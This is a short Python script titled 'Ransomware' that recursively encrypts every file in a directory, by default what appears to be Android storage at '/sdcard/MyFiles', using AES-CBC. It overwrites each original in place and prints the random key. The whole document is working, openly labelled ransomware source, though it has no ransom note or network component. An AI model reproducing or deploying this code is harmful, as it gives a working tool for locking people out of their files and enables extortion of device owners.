# Ransomwareimport os
import secrets
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def encrypt_file(file_path, key, iv):
    """
    Encrypts a single file using AES-CBC.

    Args:
        file_path: Path to the file to encrypt.
        key: Encryption key.
        iv: Initialization vector.

    Returns:
        True if encryption was successful, False otherwise.
    """
    try:
        with open(file_path, 'rb') as file:
            data = file.read()

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        with open(file_path, 'wb') as file:
            file.write(iv + encrypted_data)

        return True
    except Exception as e:
        print(f"Error encrypting file {file_path}: {str(e)}")
        return False

def encrypt_directory(directory_path, key):
    """
    Encrypts all files within a directory and its subdirectories.

    Args:
        directory_path: Path to the directory to encrypt.
        key: Encryption key.

    Returns:
        Number of files successfully encrypted.
    """
    encrypted_count = 0
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            iv = secrets.token_bytes(16)  # Generate a new IV for each file
            if encrypt_file(file_path, key, iv):
                encrypted_count += 1
    return encrypted_count

def generate_random_key(length=32):
    """
    Generates a random key of the specified length.

    Args:
        length: Length of the key in bytes (default: 32).

    Returns:
        Randomly generated key.
    """
    return secrets.token_bytes(length)

if __name__ == "__main__":
    directory_path = '/sdcard/MyFiles'  # Replace with the actual directory path
    if not os.path.exists(directory_path):
        print(f"Directory {directory_path} does not exist.")
    else:
        key = generate_random_key()
        encrypted_count = encrypt_directory(directory_path, key)
        print(f"Encryption complete. {encrypted_count} files encrypted.")
        # Store the key securely (e.g., in a password manager)
        print(f"Encryption key: {key.hex()}")
